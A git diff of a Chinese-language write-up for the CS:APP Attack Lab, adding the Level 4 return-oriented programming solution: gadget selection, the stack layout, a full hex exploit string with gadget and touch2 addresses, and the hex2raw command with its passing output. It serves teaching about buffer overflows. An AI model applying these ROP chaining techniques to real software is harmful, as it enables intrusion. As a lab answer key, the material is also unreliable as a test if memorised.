@@ -33,12 +33,6 @@
 *   ROP攻击只能使用`start_farm`到`end_farm`之间定义的代码片段。
 
 
-
-
-
-
-
-
 ### 1.6 实用工具与技巧
 
 **反编译与分析环境准备**：
@@ -521,7 +515,7 @@ void setval_210(unsigned *p) {
 
 ### 3.1 Level 4：ROP实现Level 2 (35分)
 *   **目标**：使用`gadget farm`中的工具，让程序跳转到`touch2`并传入`cookie`。
-*   **基本工具：** 可以使用以下类型的指令构造 `gadget`，并且仅限使用前八个 `x86-64` 寄存器（`%rax–%rdi`）：
+*   **工具：** 可以使用以下类型的指令构造 `gadget`，并且仅限使用前八个 `x86-64` 寄存器（`%rax–%rdi`）：
     *  movq
     ![alt text](image-4.png)
     *  popq
@@ -531,9 +525,112 @@ void setval_210(unsigned *p) {
 *   **建议**
     *   所需的所有 `gadget` 都可以在 `rtarget` 中 `start_farm` 到 `mid_farm` 之间的代码区域中找到。
     *   仅用两个 `gadget` 完成此次攻击。
-    *   当 `gadget` 包含 `popq` 指令时，它会从栈中弹出数据。因此，**攻击字符串（`exploit string`）将同时包含 `gadget` 地址和所需的数据。**
+    *   当 `gadget` 包含 `popq` 指令时，它会从栈中弹出数据。因此，**攻击字符串（`exploit string`）需要同时包含 `gadget` 地址和所需的数据。**
 
-### 3.3 Level 5 ：ROP实现Level 3(5分 - 高难度)
+
+#### 3.1.1 分析
+
+**目标**：
+
+本题的任务与`level 2`相同，都是要求返回到`touch2`函数，`level 2`中用到的注入代码为：
+```s
+movq $0x59b997fa %rdi
+push $0x4017ec
+ret
+```
+
+**获取`rtarget`的汇编代码及其字节级别表示**
+
+```sh
+objdump -d rtarget >> readrtarget
+```
+
+**问题分析**
+
+但是无法找到带指定立即数的 `gadget`，因此需要寻找其他方法。
+
+- **方案一：** 考虑将 cookie 放在栈中然后利用如下`gadget`  将 `cookie` 赋值给 `%rdi`。当 `ret` 后，从栈中取出来的返回地址在设置为`touch2`的地址就可以实现目标。**但是在`farm`中无法找到上述指令的`gadget`。**
+
+    ```s
+    pop %rdi  # 5f c3 或 5f 90 c3
+    ret
+    ```
+
+
+
+- **方案二**: 题目提示可以需要用两个`gadget`指令完成此次攻击，因此可以使用两个`gadget`。
+
+  - 首先利用第一个`gadget`将 栈里的 cookie 利用  pop 指令弹出到某个寄存器a
+  - 然后利用 mov `gadget` 将 a 中的值移动到 rdi
+
+    ```s
+    popq %rax
+    ret
+
+    ------
+
+    movq %rax %rdi
+    ret
+    ```
+
+    此时执行流程为：
+
+    ```txt
+    栈上数据： [gadget1地址] → [cookie值] → [gadget2地址] → [touch2地址]
+                ↑               ↑               ↑               ↑
+                popq %rax      被pop到rax      movq %rax,%rdi  跳转到touch2
+    ```
+
+#### 3.1.2 解决方案
+
+**攻击初始条件**
+  1. getbuf函数有40字节的缓冲区
+  2. 通过缓冲区溢出，我们可以覆盖返回地址和后续栈空间
+  3. 需要将`cookie`值0`x59b997fa`传递给`touch2`函数作为参数（放入`%rdi`）
+
+**栈布局设计（从低地址到高地址）**
+
+![alt text](image-8.png)
+
+**执行流程**
+
+```
+getbuf返回 → gadget1(pop rax) → gadget2(mov rdi, rax) → touch2
+      ↓              ↓                   ↓
+    ret         pop cookie         mov到rdi
+      ↓              ↓                   ↓
+   跳转gadget1   ret跳gadget2     ret跳touch2
+```
+
+**构造输入序列**
+
+```txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00  # gadget 1
+fa 97 b9 59 00 00 00 00  # cookie
+c5 19 40 00 00 00 00 00  # gadget 2
+ec 17 40 00 00 00 00 00  # touch2
+```
+
+**执行命令**
+
+```sh
+./hex2raw < rsolution1.txt | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
+
+### 3.2 Level 5 ：ROP实现Level 3(5分 - 高难度)
 
 *   **目标**：使用`gadget farm`中的工具，让程序跳转到`touch3`并传入`cookie`字符串的地址。
 *   **方法**：
